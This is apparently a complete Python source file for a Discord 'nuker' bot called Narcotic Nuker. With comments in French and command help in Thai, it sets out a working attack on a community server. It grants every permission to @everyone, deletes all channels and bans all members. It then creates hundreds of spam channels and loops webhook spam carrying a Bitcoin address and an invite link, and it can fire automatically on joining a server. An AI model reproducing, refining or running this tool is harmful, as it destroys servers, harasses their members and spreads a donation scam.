import discord, random, aiohttp, asyncio, os
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
from colorama import init
init()

# Config bot

token = "Token bot"
prefix = "!"

# Config nuke

spam_messages = ["@everyone Bitcoin adress : `bc1qs68vekz5rs33nupyxrp78uqxq72gsj7gqp4y0u`", "@everyone new server discord.gg/lgbt"] # messages à spam
channel_names = ["🔱spam🔱", "🔱Hee🔱"] # nom des salons à créer
webhook_usernames = ["Nuke", "@everyone GOT"] # nom des webhook
nuke_on_join = False
nuke_wait_time = 0

bot = commands.Bot(command_prefix = prefix)

@bot.event
async def on_ready():
  print(f"""
{S.BRIGHT}{C.LIGHTBLUE_EX}Le Bot est ON{S.NORMAL}
Le script est connecté à : {C.WHITE}{bot.user}

{C.RED}[+] Commande {C.WHITE}{prefix}spam {C.RED}pour nuke
{C.RED}[+] Commande {C.WHITE}{prefix}cmds {C.RED}pour obtenir la liste des commandes.

{C.RED}->{C.WHITE} Inviter le bot : {C.LIGHTBLUE_EX}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot
""")

@bot.command()
async def cmds(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "2SOFAXZ", 
    description = """

``{prefixe} + cmds``
แสดงคำสั่งทั้งหมด
 
``{prefixe} + spam``
ระเบิดเชิฟ
 
``{prefixe} + ping`` ``<message>``
ปิงข้อความ(บัค)
 
``{prefixe} + channel`` ``<nombre de salons> [nom des salons]``
créer des salons avec un nom donné (loop)
 
``{prefixe} + delete``
ลบห้อง
 
``{prefixe} + logout``
ออกจากระบบ

``ζ͜͡2SOFAXZ • https://github.com/2SOFAXZ``
""")
  await author.send(embed = cmds)


async def nuke(guild):
  print(f"{C.WHITE}Le serveur {guild.name} se fait atomiser.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.MAGENTA}Les perms admin ont été obtenues sur {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Les perms admin n'ont pas pu être obtenues sur {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Le salon {C.WHITE}{channel.name} {C.BLUE}a été supprimé avec succès.")
    except:
      print(f"{C.RED}Le salon {C.WHITE}{channel.name} {C.RED}n'a pas pu être supprimé.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"{C.GREEN} {C.WHITE}{member.name}")
    except:
      print(f"{C.RED}Le membre{C.WHITE}{member.name} {C.RED}n'a pas pu être banni.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Le Serveur {guild.name} a été atomisé.")
  
@bot.command()
async def spam(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)
  
@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return
  
@bot.command()
async def ping(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Erreur de spam : {C.WHITE}[Les messages n'ont pas pu être envoyés]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Erreur de ping : {C.WHITE}[Les messages n'ont pas pu être envoyés]")
        return
      except:
        pass

@bot.command()
async def channel(ctx, amount = 10, *, name = None):
  if name == None:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print(f"{C.RED}Erreur : {C.WHITE}[Les salons n'ont pas pu être créés]")
        return
      except:
        pass
  else:
    for i in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print(f"{C.RED}Erreur : {C.WHITE}[Les salons n'ont pas pu être créés]")
        return
      except:
        pass

@bot.command()
async def delete(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Le salon {C.WHITE}{channel.name} {C.BLUE}a été supprimé avec succès.")
    except:
      print(f"{C.RED}Le salon {C.WHITE}{channel.name} {C.RED}n'a pas pu être supprimé.")

@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "narcotic") # ne pas changer
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))

@bot.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

os.system("title [Narcotic Nuker]")

if __name__ == "__main__":
  print(f"""
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗  {S.RESET_ALL}
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗ {S.RESET_ALL}
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝ {S.RESET_ALL}
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗ {S.RESET_ALL}
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║ {S.RESET_ALL}
                    {S.RESET_ALL}{C.LIGHTBLUE_EX}{S.BRIGHT}  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ {S.RESET_ALL}
                    {S.RESET_ALL}
                                    {C.RED}Narcotic {C.WHITE}•{C.RED} BETA
  """)
  try:
    bot.run(token)
  except discord.LoginFailure:
    print(f"{C.RED}Erreur de connexion au client. {C.WHITE}[Token Invalide]")
  except discord.HTTPException:
    print(f"{C.RED}Erreur de connexion au client. {C.WHITE}[Erreur Inconnue]")